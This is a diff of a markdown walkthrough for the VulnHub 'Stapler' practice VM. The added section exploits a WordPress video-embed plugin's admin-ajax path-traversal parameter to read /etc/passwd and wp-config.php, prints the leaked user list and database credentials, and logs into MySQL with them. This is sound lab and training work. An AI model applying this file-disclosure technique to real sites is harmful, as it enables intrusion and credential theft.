@@ -504,7 +504,7 @@ mv doom doom.zip && unzip doom.zip
 
 > TODO get outputs
 
-this gives us ![message2.jpg](/assets/vulnhub_stuff/stapler/stapler/message2.jpg)
+this gives us ![message2.jpg](/assets/vulnhub_stuff/stapler/message2.jpg)
 ``` bash
 #check the jpeg for hidden stuff:
 file message2.jpg 
@@ -611,7 +611,8 @@ curl http://192.168.56.104:12380 > 12380_index.html
 code review gets another user __Zoe__
 
 and a base64 encoded image:
-![decoded_20190804155642.jpeg](/assets/vulnhub_stuff/stapler/stapler/decoded_20190804155642.jpeg)
+
+![decoded_20190804155642.jpeg](/assets/vulnhub_stuff/stapler/decoded_20190804155642.jpeg)
 
 the base64 encoding _might_ give us an avenue to attack later if we have trouble uploading a shell.
 
@@ -774,12 +775,181 @@ the exploit produces a success of sorts and a url.
 
 Following the url we get a 404. hmmmm so what happened? 
 
+lets take a closer look at the url parameters of the php page:
+/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
 
+the call is not directly to a plugin url, it is to admin-ajax.php from the wp-admin directory.
 
-# TODO!!!!
-Well lets look at what the plugin does
+quick google of this returns:
 
-/blogblog/wp-content/uploads/
+`
+Introduced in WordPress 3.6 the WordPress Heartbeat API allows WordPress to communicate between the web-browser and the server. It allows for improved user session management, revision tracking, and auto saving. ... The WordPress Heartbeat API uses /wp-admin/admin-ajax.php to run AJAX calls from the web-browser.
+`
+
+ok so this is not the plugin but the WP site that is calling this
+
+Lets look at the options: action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
+
+action=ave_publishPost - action the admin-ajax.php is going to do
+title=random - filename generator for the published post
+short=1 - True
+term=1 - True
+thumb=[FILEPATH] - this is the image that is published
+
+looks like we are publishing a thumbnail picture via the ave_publishPost
+
+I try to find this method by running a grep for the method in extracted version of the backup code:
+
+```
+grep -rl "ave_publishPost" .
+```
+
+I get nothing, this is unexpected. I expected the backup code to have reference to this, closer invesigation into the source code, shows the Advanced-Video-Embed plugin is not there... bummer.
+
+This must be method specific to Advanced-Video-Embed, as it doesn't look like a standard method for WordPress.
+
+I google the source code for this, but it looks like the plugin has been pulled.
+Checking the exploit source code, gives me little more insight into what the flow is. 
+
+## Are we stuck?
+
+Well lets think about what the plugin goes, it allows an easy way to imbed video files. 
+We are esentially creating a malformed thumb image, there must be a location where this is stored.   
+The default directory for this is usually a child of wp-content.
+
+lets go there: ``` https://192.168.56.104:12380/blogblog/wp-content/```
+
+Ah ha! Directory listing!
+
+![wp-content.png](/assets/vulnhub_stuff/stapler/wp-content.png)
+
+and within uploads, what looks like a random image:
+
+![wp-uploads.png](/assets/vulnhub_stuff/stapler/wp-uploads.png)
+
+Trying to open in it in the browser gives us errors, but that is because the file is not actually a jpeg and the browser is expecting a jpeg, lets curl it:
+
+``` bash
+curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/108293608.jpeg
+```
+
+mwah hahaha! We have LFI! With the contents of the /etc/passwd we also have every system user, we can now attempt a fine scoped brute force login attempt.
+
+```
+root:x:0:0:root:/root:/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+messagebus:x:108:111::/var/run/dbus:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
+mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
+RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
+ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
+DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
+AParnell:x:1004:1004::/home/AParnell:/bin/bash
+SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
+MBassin:x:1006:1006::/home/MBassin:/bin/bash
+JBare:x:1007:1007::/home/JBare:/bin/bash
+LSolum:x:1008:1008::/home/LSolum:/bin/bash
+IChadwick:x:1009:1009::/home/IChadwick:/bin/false
+MFrei:x:1010:1010::/home/MFrei:/bin/bash
+SStroud:x:1011:1011::/home/SStroud:/bin/bash
+CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
+JKanode:x:1013:1013::/home/JKanode:/bin/bash
+CJoo:x:1014:1014::/home/CJoo:/bin/bash
+Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
+LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
+JLipps:x:1017:1017::/home/JLipps:/bin/sh
+jamie:x:1018:1018::/home/jamie:/bin/sh
+Sam:x:1019:1019::/home/Sam:/bin/zsh
+Drew:x:1020:1020::/home/Drew:/bin/bash
+jess:x:1021:1021::/home/jess:/bin/bash
+SHAY:x:1022:1022::/home/SHAY:/bin/bash
+Taylor:x:1023:1023::/home/Taylor:/bin/sh
+mel:x:1024:1024::/home/mel:/bin/bash
+kai:x:1025:1025::/home/kai:/bin/sh
+zoe:x:1026:1026::/home/zoe:/bin/bash
+NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
+www:x:1028:1028::/home/www:
+postfix:x:112:118::/var/spool/postfix:/bin/false
+ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
+elly:x:1029:1029::/home/elly:/bin/bash
+```
+
+Before we fire up a brute force attack, we should check to see if there are any other bits of information we can leverage. Reviewing the WP backup, I noticed there is no wp-config.php only wp-config-sample.php. wp-config.php is where an admin can hard code credentials to manage the dB, a dB we might be able to get access to if we can get root password. We know from earlier root login is possible on the dB, lets try and get the details.
+
+Lets create a new 'image' by going to: 
+```https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php```
+
+then curling:
+
+``` bash
+curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/1006632345.jpeg
+```
+
+quick way to refernce only the dB details:
+
+``` bash
+curl -k https://192.168.56.104:12380/blogblog/wp-content/uploads/1006632345.jpeg | grep "DB"
+```
+yields root:plbkac as the dB root password
+
+```
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'plbkac');
+define('DB_HOST', 'localhost');
+define('DB_CHARSET', 'utf8mb4');
+define('DB_COLLATE', '');
+define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
+```
+
+lets try logging in:
+
+``` Bash
+mysql -h $STAPLER_IP -u root -pplbkac 
+# note no spaces for password!
+
+```
+I'm in!
+
+```
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 32
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+```
+
+At this point I have value extraction.
+
 
 > Bonus Shell upgrade - TODO
 
